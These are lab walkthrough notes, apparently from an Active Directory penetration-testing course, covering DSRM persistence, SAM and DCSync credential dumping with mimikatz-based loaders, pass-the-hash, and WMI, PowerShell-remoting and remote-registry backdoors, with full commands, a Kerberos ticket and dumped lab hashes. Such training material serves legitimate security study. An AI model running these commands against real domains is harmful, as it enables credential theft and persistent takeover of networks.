      Gw8g33qKQqafU2hP0oXQjdJmQY/AEXZC45ahWjXGSiWVhZe15GhDNsmRKX5ee23FIXBoU/aygwvrnb+E
      rJMb1MCSMd29Cktzz37X+hbDiEGWdtLzeVDYecI2u1oF8GWJiTmvWuybRFd2OBgcZ8fTXf2veluWR72Q
      ZGl63z2vOfJ/jy2t09tf61TG3GAB8cYrZeH0CQfYM9G/IEdspTF1wzVH3DRkPbKz1eoQbXSPLO6Wc7X3
      6IOgcyuGVrbTVOgw8mBKwtmVKjbDeg/diZ0zp601j4LD3gr8ku/i62f9AfuDfjY5q1+ILH/KvwMvPrR6
      efrq8TJ+nxKlQeJROzw4RnfOa2y/jkn/C0WylyRfd6LTQeqWY/w4Ook4tKCjb1OCbfxsEW/Hl4DG4zdh
      0dViU8ZxCJfJh/TNSruzn40RWWSfmcshclP324TdmV0TPs2nUg8Z7EMglLtuxSW/mlRPjY5abbCaj+Io
      bY/Dueh2O1Fe8CS+HOzYD5yOUQcr+8bLZdEF1ytpr/wdRz7PBhcgwQv1/TWRHnB1QheZ80drcyjlGBId
      jXuIAP15ZOSAF/3lgsuDgOXjaNM/J4fl3FtLZ+cmeKcCgYmvtRv/rOwerJomJDSuDVzkq4BffLJYxaWZ
      8uMjnpV/j4ZbxXUZCM+/0VQXu1oB5ZL2WTOEV4YiB0KSMS1+T1ktc/GCTTKcd4brLc3EGTxgUXyF0Vpo
      klN35Sw/jD2b2IXfFTlcSkwvh+svzME6UlwRoG9How4huD/mRgpEANWSeZTrLB+oCuQ7YXIEtbsydUTC
      WeU1uP7SHK5imQzlRAaKZNGejVvqWbkJyay5XHAgHnUA+KlL4PzaVfiP4g0cA1szjj676z8BJ/WW/DlL
      HgCramEFtL4KEUTP0f9Q5ZYMXwtCr6zvNIg+N+jxGa2rzViq3Yn2mASSsN3RcejZPej/E4rxdqhgGYrk
      HOlKXsuL+8DQtePvgNltJnsvbpJ6QlHx9rWJyWcX8sLJV7resdv/WaU8xHXJalGO0VIaNng42L0xJqec
      X3jNpaobCdjLVXr4EfLB1VSUvoFee3pkRdwmhw+EKJQwgnvmCs3YURyPfZTWlU5zpzTxzaBuRnP19kKK
      hFJh8s5tHKfU2y4nGt73emP35v0GsZcSbt+FIQBwN+O8hIYGMCLv+LcTz71PNuc/2tXWBR1BtAuRztf3
      Q09PcsvuSutwQMQVFDwtntHtY9VNVB3Wyif6CrRsEUkfL1T4l+MBEzG9MjGjggEaMIIBFqADAgEAooIB
      DQSCAQl9ggEFMIIBAaCB/jCB+zCB+KArMCmgAwIBEqEiBCBOngffSAGFE4zbuccYcKgOpggKeI/fc8CH
      J9OnDOZEfKEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDWFkbWluaXN0
      cmF0b3KjBwMFAGChAAClERgPMjAyNTA5MjUxMjI0MjVaphEYDzIwMjUwOTI1MjIyMjU5WqcRGA8yMDI1
      MTAwMjEyMjI1OVqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMCAQKhJjAkGwZrcmJ0
      Z3QbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FM


[+] Ticket successfully imported!
```
### Access the DC using winrs from the new spawned process.
* C:\Windows\system32> winrs -r:dcorp-dc cmd

* C:\Users\Administrator>set username
```
set username
USERNAME=administrator
```

* C:\Users\Administrator>set computername
```
set computername
COMPUTERNAME=DCORP-DC
```
### Learning Objective 11:
```
• Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence. 
```

### We can persist with administrative access to the DC once we have Domain Admin privileges by abusing the DSRM administrator

### Start a process with domain admin privileges

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

### Copy Loader.exe to the DC and extract credentials from the SAM hive
* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
* C:\Windows\system32> winrs -r:dcorp-dc cmd

* C:\Users\svcadmin> set computername
```
set computername
COMPUTERNAME=DCORP-DC
```

* C:\Users\svcadmin> set username
```
set username
USERNAME=svcadmin
```

* C:\Users\svcadmin> **netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31**
* C:\Users\svcadmin> **C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"**
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments : token::elevate lsadump::evasive-sam exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://127.0.0.1:8080/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://127.0.0.1:8080/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # -args
ERROR mimikatz_doLocal ; "-args" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

600     {0;000003e7} 1 D 20314          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;02551a54} 0 D 39331925    dcorp\svcadmin  S-1-5-21-719815819-3726368948-3917688648-1118   (12g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 39378128    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::evasive-sam
Domain : DCORP-DC
SysKey : bab78acd91795c983aef0534e0db38c7
Local SID : S-1-5-21-627273635-3076012327-2140009870

SAMKey : f3a9473cb084668dcf1d7e5f47562659

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

mimikatz(commandline) # exit
Bye!
```

### The DSRM administrator is not allowed to logon to the DC from network. 
### So, we need to change the logon behavior for the account by modifying registry on the DC.

* C:\Users\svcadmin> reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f

### Now on the student VM, we can use Pass-The-Hash (not OverPass-The-Hash) for the DSRM administrator

* C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -Path
ERROR mimikatz_doLocal ; "-Path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # C:\AD\Tools\SafetyKatz.exe
ERROR mimikatz_doLocal ; "C:\AD\Tools\SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe
user    : Administrator
domain  : dcorp-dc
program : cmd.exe
impers. : no
NTLM    : a102ad5753f4c441e3af31c97fad86fd
  |  PID  6132
  |  TID  504
  |  LSA Process is now R/W
  |  LUID 0 ; 47596933 (00000000:02d64585)
  \_ msv1_0   - data copy @ 0000025B6CFE4B90 : OK !
  \_ kerberos - data copy @ 0000025B6CFED4A8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000025B6CFBEB28 (32) -> null

mimikatz(commandline) # exit
Bye!
```

### From the new procees, we can now access dcorp-dc. Note that we are using PowerShell Remoting with IP address and Authentication - 'NegotiateWithImplicitCredential' as we are using NTLM authentication. 
### So, we must modify TrustedHosts for the student VM. Run the beklow command from an elevated PowerShell session

* PS C:\Windows\system32> Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```
WinRM Security Configuration.
This command modifies the TrustedHosts list for the WinRM client. The computers in the TrustedHosts list might not be authenticated. The client might send credential information to these computers. Are you sure that you want to
modify this list?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
```

* C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

* PS C:\Windows\system32> Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential

* [172.16.2.1]: PS C:\Users\Administrator.DCORP-DC\Documents> $env:username 
```
Administrator
```

### Learning Objective 12:
```
• Check if studentx has Replication (DCSync) rights. 
• If yes, execute the DCSync attack to pull hashes of the krbtgt user.
• If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of 
the krbtgt user. 
```

### We can check if studentx has replication rights using the following commands

```
C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

PS C:\AD\Tools> . C:\AD\Tools\PowerView.ps1

PS C:\AD\Tools> Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student731"}
```

### If the studentx does not have replication rights, let's add the rights.
### Start a process as Domain Administrator by running the below command from an elevated command prompt

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin / aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt


### Run the below commands in the new process. Remember to change student731 to your user

* C:\Windows\system32> C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
* PS C:\Windows\system32> . C:\AD\Tools\PowerView.ps1
* PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student731 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (|(|(samAccountName=student731)(name=student731)(displayname=student731)))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Invoke-LDAPQuery] filter string: (&(|(|(samAccountName=student731)(name=student731)(displayname=student731))))
VERBOSE: [Get-DomainObject] Error disposing of the Results object: Method invocation failed because [System.DirectoryServices.SearchResult] does not contain a method named 'dispose'.
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (|(distinguishedname=DC=dollarcorp,DC=moneycorp,DC=local))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Invoke-LDAPQuery] filter string: (&(|(distinguishedname=DC=dollarcorp,DC=moneycorp,DC=local)))
VERBOSE: [Get-DomainObject] Error disposing of the Results object: Method invocation failed because [System.DirectoryServices.SearchResult] does not contain a method named 'dispose'.
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student731,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local 'DCSync' on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student731,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student731,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student731,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=dollarcorp,DC=moneycorp,DC=local
```

### Let's check for the rights once again from a normal shell

* Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student731"}
```
AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20611
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student731

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20611
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student731

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20611
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student731
```

### Now, below command (or any similar tool) can be used as studentx to get the hashes of krbtgt user or any other user.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\SafetyKatz.exe Arguments : lsadump::evasive-dcsync /user:dcorp\krbtgt exit

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd

mimikatz(commandline) # exit
Bye!
```

### Learning Objective 13:
```
• Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI 
without requiring administrator access.
• Retrieve machine account hash from dcorp-dc without using administrator access and use that 
to execute a Silver Ticket attack to get code execution with WMI.
```

### Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. 
### Below command (to be run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to WMI

* C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\AD\Tools> . C:\AD\Tools\RACE.ps1
* PS C:\AD\Tools> Set-RemoteWMI -SamAccountName student731 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
VERBOSE: Existing ACL for namespace root\cimv2 is O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)
VERBOSE: Existing ACL for DCOM is
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCDCSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2
453885448-3625952902-991631256)
VERBOSE: New ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20611)
VERBOSE: New ACL for DCOM
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCDCSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2
453885448-3625952902-991631256)(A;;CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20611)
```

### Now, we can execute WMI queries on the DC as student731
* PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

### Similar modification can be done to PowerShell remoting configuration
* PS C:\AD\Tools> . C:\AD\Tools\RACE.ps1
* PS C:\AD\Tools> Set-RemotePSRemoting -SamAccountName student731 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```
[dcorp-dc.dollarcorp.moneycorp.local] Processing data from remote server dcorp-dc.dollarcorp.moneycorp.local failed with the following error message: The I/O operation has been aborted because of either a
thread exit or an application request. For more information, see the about_Remote_Troubleshooting Help topic.
    + CategoryInfo          : OpenError: (dcorp-dc.dollarcorp.moneycorp.local:String) [], PSRemotingTransportException
    + FullyQualifiedErrorId : WinRMOperationAborted,PSSessionStateBroken
```

### Similar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it). Please note that this is unstable since some patches in August 2020.

### Run as normal user
* PS C:\AD\Tools> Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
student731
```

### To retrieve machine account hash without DA, first we need to modify permissions on the DC. 

### Run the below command as DA
*PS C:\AD\Tools> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student731 -Verbose
```
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : ] Using trustee username 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Remote registry is not running, attempting to start
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Attaching to remote registry through StdRegProv
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating the trustee WMI object with user 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating the trustee WMI object with user 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating the trustee WMI object with user 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating the trustee WMI object with user 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Applying Trustee to new Ace
